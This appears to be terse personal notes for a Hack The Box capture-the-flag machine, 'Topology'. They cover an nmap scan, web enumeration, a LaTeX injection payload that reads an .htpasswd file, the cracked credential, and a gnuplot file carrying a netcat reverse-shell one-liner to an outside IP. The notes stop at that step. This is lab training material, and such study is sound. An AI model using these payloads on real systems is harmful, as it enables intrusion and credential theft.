# #1 Introduction
<img width="691" alt="image" src="https://github.com/Mate0r/app.hackthebock.com/assets/94843357/17b93d9f-213a-43e4-8df5-45d166672edb">

# #2 nmap

we first add a domain in /etc/hosts so we don't need to remember the IP
```bash
10.10.xx.xx topology.htb
```

we run an nmap scan as sudo so it's doing a SYN scan and not a full TCP connection so it's faster

```bash
sudo nmap -T4 -sV -p- topology.htb
```

we got these open ports
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# #3 user.txt

## HTTP (port 80)

http://latex.topology.htb/equation.php
http://stats.topology.htb/
http://dev.topology.htb/

http://topology.htb/css/
http://topology.htb/images/
http://topology.htb/javascript/
http://topology.htb/portraits/


hta                    [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 2816ms]
.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 2818ms]
.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 2816ms]
~lp                     [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 2831ms]
~nobody                 [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 2824ms]
~bin                    [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 2831ms]
~sys                    [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 2821ms]
~mail                   [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 2824ms]
css                     [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 4291ms]
images                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 5037ms]
index.html              [Status: 200, Size: 6767, Words: 1612, Lines: 175, Duration: 5173ms]
javascript              [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 5037ms]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 5076ms]


\texttt{\lstinputlisting{/var/www/dev/.htpasswd}}

vdaisley:$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0

vdaisley:calculus20


/opt/gnuplot

echo 'system "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.192 6666 >/tmp/f"' > /opt/gnuplot/test.plt
